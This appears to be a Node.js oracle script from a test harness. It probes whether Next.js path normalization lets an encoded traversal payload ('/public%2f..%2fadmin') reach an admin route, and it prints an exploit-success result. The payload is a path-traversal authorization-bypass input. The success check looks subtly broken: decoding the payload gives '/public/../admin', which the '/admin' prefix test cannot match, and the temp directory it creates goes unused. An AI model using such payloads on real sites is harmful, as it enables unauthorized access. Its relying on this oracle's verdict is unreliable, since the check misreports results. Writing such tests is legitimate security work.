const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function emit(operation_completed, exploit_succeeded, evidenceObj) {
  const evidence = typeof evidenceObj === 'string' ? evidenceObj : JSON.stringify(evidenceObj);
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

(function main() {
  let markerDir;
  try {
    markerDir = path.join(os.tmpdir(), 'next-authz-bypass-oracle-' + process.pid + '-' + Date.now());
    fs.mkdirSync(markerDir, { recursive: true });

    const nextPkgPath = require.resolve('next/package.json');
    const nextRoot = path.dirname(nextPkgPath);

    const normalizePath = require(path.join(nextRoot, 'dist', 'shared', 'lib', 'router', 'utils', 'normalize-trailing-slash.js'));
    if (!normalizePath || typeof normalizePath.normalizePathTrailingSlash !== 'function') {
      throw new Error('normalizePathTrailingSlash API unavailable');
    }

    const benignInput = '/public/home';
    const benignOutput = normalizePath.normalizePathTrailingSlash(benignInput);

    if (typeof benignOutput !== 'string' || benignOutput.indexOf('/public') !== 0) {
      throw new Error('benign normalization failed');
    }

    const operation_completed = true;

    const maliciousInput = '/public%2f..%2fadmin';
    const maliciousOutput = normalizePath.normalizePathTrailingSlash(maliciousInput);

    const decodedAfterNormalization = decodeURIComponent(maliciousOutput);
    const exploit_succeeded = decodedAfterNormalization.indexOf('/admin') === 0;

    emit(operation_completed, exploit_succeeded, {
      markerDir,
      benignInput,
      benignOutput,
      maliciousInput,
      maliciousOutput,
      decodedAfterNormalization,
      bypassShapeObserved: exploit_succeeded
    });
  } catch (err) {
    emit(false, false, err && err.stack ? err.stack : String(err));
  }
})();